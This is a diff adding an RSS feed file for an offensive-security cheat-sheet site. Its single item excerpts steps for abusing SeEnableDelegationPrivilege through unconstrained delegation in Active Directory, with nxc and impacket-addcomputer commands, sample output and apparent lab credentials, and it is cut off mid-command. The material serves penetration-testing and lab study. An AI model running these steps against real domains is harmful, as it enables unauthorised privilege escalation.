@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Unonstrained Delegation on TLDRBins</title>
+    <link>https://tldrbins.github.io/@unonstrained-delegation/</link>
+    <description>Recent content in Unonstrained Delegation on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@unonstrained-delegation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SeEnableDelegationPrivilege</title>
+      <link>https://tldrbins.github.io/seenabledelegationprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seenabledelegationprivilege/</guid>
+      <description>Abuse #1: Unconstrained Delegation Linux Windows 1. Check Machine Quota # Password nxc ldap &amp;lt;DC&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq $ nxc ldap DC1.delegate.vl -u &amp;#39;N.Thompson&amp;#39; -p &amp;#39;KALEB_2341&amp;#39; -d delegate.vl -M maq LDAP 10.10.72.178 389 DC1 [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) LDAP 10.10.72.178 389 DC1 [+] delegate.vl\N.Thompson:KALEB_2341 MAQ 10.10.72.178 389 DC1 [*] Getting the MachineAccountQuota MAQ 10.10.72.178 389 DC1 MachineAccountQuota: 10 2. Create a Computer # Password impacket-addcomputer -computer-name &amp;#39;&amp;lt;NEW_COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;Test1234&amp;#39; -dc-ip 10.</description>
+    </item>
+  </channel>
+</rss>
